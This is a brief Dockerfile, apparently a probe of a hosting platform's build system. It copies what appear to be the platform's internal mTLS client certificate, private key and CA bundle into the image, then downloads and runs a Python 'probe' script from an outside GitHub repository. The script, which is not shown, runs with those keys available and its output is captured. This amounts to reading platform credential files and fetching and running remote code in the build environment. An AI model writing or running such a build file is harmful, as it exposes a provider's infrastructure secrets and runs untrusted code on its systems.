# MARK-I68068-gwroute-4c1e9b
FROM alpine:3.20
RUN echo MARK-I68068-gwroute-4c1e9b-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 30 -o /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe_i68068.py && wc -l /p.py && echo DL_OK
RUN MARK=I68068-gwroute-4c1e9b timeout -s KILL 420 python3 /p.py 2>&1 | head -c 45000
CMD ["sh","-c","sleep 60"]
